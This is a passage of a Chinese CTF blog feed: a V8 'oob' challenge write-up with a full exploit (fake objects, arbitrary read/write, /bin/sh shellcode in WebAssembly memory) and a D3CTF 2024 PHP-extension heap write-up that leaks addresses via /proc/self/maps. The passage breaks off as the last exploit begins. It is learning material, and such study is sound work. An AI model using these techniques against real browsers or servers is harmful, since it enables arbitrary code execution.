<code>BackingStore</code>。<code>DataView</code> 对象中的 <code>backing_store</code> 会指向申请的 <code>data_buf</code> (<code>backing_store</code> 相当于我们的 <code>elements</code>)，修改 <code>backing_store</code> 为我们想要写的地址，并通过 <code>DataView</code> 对象的 <code>setBigUint64</code> 方法就可以往指定地址正常写入数据了。<br>那现在我们的思路就很明确了，首先申请 <code>2</code> 个 <code>ArrayBuffer</code> 对象 <code>ab1</code>、<code>ab2</code>，申请他们各自的 <code>DataView</code> 对象 <code>dv1</code>、<code>dv2</code>。将伪造的 <code>fakeobj</code> 的 <code>elements</code> 指向 <code>dv1</code> 的 <code>BackingStore-0x10</code>，再通过修改 <code>fakeobj</code> 令 <code>dv1</code> 的 <code>BackingStore</code> 指向 <code>dv2</code> 的 <code>BackingStore-0x10</code><br>此时，我们可以通过修改 <code>fakeobj</code> 来修改 <code>dv2</code> <code>BackingStore</code> 处的值，最后通过 <code>dv2</code> 的内置函数来实现任意地址的读写。提醒一下，这里要区分开 <code>BackingStore</code> 的地址和 <code>BackingStore</code> 地址出的值这2个概念。原语封装函数如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>十分简单的入门了一下 <code>v8</code> 漏洞利用，该类漏洞以及利用方式还有很多，看来有的学了<br>今天 <code>Csome</code> 学长在 <code>defcon</code> 拿了一血，太牛拉  </p><img src="/2024/05/05/v8start/10.png" class="" title="我的图图呢">  <p>哎，我也想成为像他那么强，还有很长的路要走啊。md，不说那么多了，开卷！！！<br>参考：<br><a href="https://www.anquanke.com/post/id/267518">https://www.anquanke.com/post/id/267518</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/130124693">https://blog.csdn.net/qq_45323960/article/details/130124693</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/134934993">https://blog.csdn.net/weixin_46483787/article/details/134934993</a><br><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一直觉得 &lt;code&gt;v8&lt;/code&gt; 漏洞利用是一件非常好玩的事情，所以找时间入门了一下，这篇博客所使用的环境是 &lt;code&gt;*CTF 2019&lt;/code&gt; 的 &lt;code&gt;oob&lt;/code&gt;，相关附件读者可以自行上网搜索下载。这篇博客主要用于总结本人在入门 &lt;co</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>D3CTF 2024</title>
    <link href="https://qanux.github.io/2024/04/29/d3ctf2024/"/>
    <id>https://qanux.github.io/2024/04/29/d3ctf2024/</id>
    <published>2024-04-28T16:59:35.396Z</published>
    <updated>2024-04-29T10:35:12.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PwnShell"><a href="#PwnShell" class="headerlink" title="PwnShell"></a>PwnShell</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>很久以前就听说过 <code>php pwn</code>，没想到就在这里遇到了。出题人自己实现了一个 <code>php</code> 扩展模块 <code>vuln.so</code>，很显然漏洞就来源于这里，通过逆向分析发现出题人在这个模块中实现的菜单堆，其漏洞函数如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v11; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = &amp;chunkList[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )                        <span class="comment">// 寻找空闲堆块</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 += <span class="number">0x10</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[<span class="number">4</span> * v2];</span><br><span class="line">      v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL) + <span class="number">0x10</span>LL);<span class="comment">// v14字符串长度+0x10</span></span><br><span class="line">      v9 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL));<span class="comment">// v15字符串的长度</span></span><br><span class="line">      *v8 = v9;                                 <span class="comment">// 存v15的地址</span></span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL);<span class="comment">// v15字符串长度</span></span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">0x18</span>LL);<span class="comment">// v15字符串的起始地址</span></span><br><span class="line">      v8[<span class="number">1</span>] = v10;                              <span class="comment">// 存v15字符串的长度</span></span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);                     <span class="comment">// 复制v15字符串内容到v9中</span></span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">0x18</span>LL), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">0x10</span>LL);<span class="comment">// 存v14字符串的长度</span></span><br><span class="line">      *(_QWORD *)v7 = v8;</span><br><span class="line">      v7[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">      *((_BYTE *)v8 + v13 + <span class="number">0x10</span>) = <span class="number">0</span>;          <span class="comment">// 存在off by null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先对部分语句进行介绍，首先是下面这段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>其作用是获取函数的参数个数。接下来是 <code>zend_parse_parameters</code> 函数，其函数原型为：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">END_API <span class="type">int</span> <span class="title function_">zend_parse_parameters</span><span class="params">(<span class="type">int</span> num_args, <span class="type">const</span> <span class="type">char</span> *type_spec, ...)</span></span><br></pre></td></tr></table></figure><p>第一个参数是传递的参数个数。通常使用 <code>ZEND_NUM_ARGS()</code> 来获取。 第二个参数是一个字符串，指定了函数期望的各个参数的类型，后面紧跟着需要随参数值更新的变量列表。 因为 <code>php</code> 采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。<br>下表列出了可能指定的类型：  </p><table><thead><tr><th>类型指定符</th><th>对应的C类型</th><th>描述</th></tr></thead><tbody><tr><td>l</td><td>long</td><td>符号整数</td></tr><tr><td>d</td><td>double</td><td>浮点数</td></tr><tr><td>s</td><td>char *, int</td><td>二进制字符串，长度</td></tr><tr><td>b</td><td>zend_bool</td><td>逻辑型（1或0）</td></tr><tr><td>r</td><td>zval *</td><td>资源（文件指针，数据库连接等）</td></tr><tr><td>a</td><td>zval *</td><td>联合数组</td></tr><tr><td>o</td><td>zval *</td><td>任何类型的对象</td></tr><tr><td>O</td><td>zval *</td><td>指定类型的对象。需要提供目标对象的类类型</td></tr><tr><td>z</td><td>zval *</td><td>无任何操作的zval</td></tr></tbody></table><p>例如下面的例子：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>该表达式则是获取两个参数 <code>str</code> 和 <code>n</code>，字符串的类型是 <code>s</code>，需要两个参数 <code>char *</code> 字符串和 <code>int</code> 长度；数字的类型 <code>l</code> ，只需要一个参数。<br>现在重新回到题目的代码，可以看到存在一个 <code>off by null</code> 漏洞（注释里面有写），这里我们就要先认识一下 <code>php</code> 的堆结构。<code>php</code> 的堆结构类似于 <code>libc 2.27</code> 的 <code>tcache</code>， 在 <code>tcache</code> 的基础上删去了 <code>head</code> 头。由此可见，<code>php</code> 的堆还是挺好利用的。由于 <code>vuln.so</code> 模块的 <code>RELRO</code> 开启状态为 <code>Partial RELRO</code>，所以我们可以通过 <code>off by null</code> 漏洞和堆风水修改堆块的 <code>fd</code> 指针，实现修改 <code>_efree</code> 函数的 <code>got</code> 表为 <code>system，</code>从而实现任意指令的执行<br>接下来的问题是如何泄露地址，这里需要用到一个 <code>linux</code> 的知识。<code>linux</code> 系统内核提供了一种通过 <code>/proc</code> 的文件系统，在程序运行时访问内核数据，改变内核设置的机制。<code>/proc</code> 是一种伪文件结构，也就是说是仅存在于内存中。<code>/proc</code> 中一般比较重要的目录是 <code>sys</code>、<code>net</code> 和 <code>scsi</code>，<code>sys</code> 目录是可写的，可以通过它来访问和修改内核的参数 <code>/proc</code> 中有一些以 <code>PID</code> 命名（进程号）的进程目录，可以读取对应进程的信息，另外还有一个 <code>/self</code> 目录，用于记录本进程的信息。也即可以通过 <code>/proc/$PID/</code> 目录来获得该进程的信息，但是这个方法需要知道进程的 <code>PID</code> 是多少，在 <code>fork</code>、<code>daemon</code> 等情况下，<code>PID</code> 可能还会发生变化。所以 <code>Linux</code> 提供了 <code>self</code> 目录，来解决这个问题，不过不同的进程来访问这个目录获得的信息是不同的，内容等价于 <code>/proc/</code> 本进程  <code>PID</code> 目录下的内容。所以可以通过 <code>self</code> 目录直接获得自身的信息，不需要知道 <code>PID</code>。<br>那么，我们这里只需要读取 <code>/proc/self/maps</code> 文件即可。然后，在输出中得到 <code>libc</code> 地址和 <code>vuln.so</code> 的地址。<br>这里，还需要用到 <code>php</code> 的一个技巧，即 <code>ob</code> 函数。在 <code>php</code> 中我们可以通过 <code>ob_start</code> 来打开缓冲区，然后程序的输出流就会被存储到变量中，我们可以使用 <code>ob_get_contents</code> 来获得 输出流，然后通过正则匹配从输出流中获得地址。<br>这部分可以当作板子来用，就像这一道题目用于泄露地址的代码为：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>exp：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 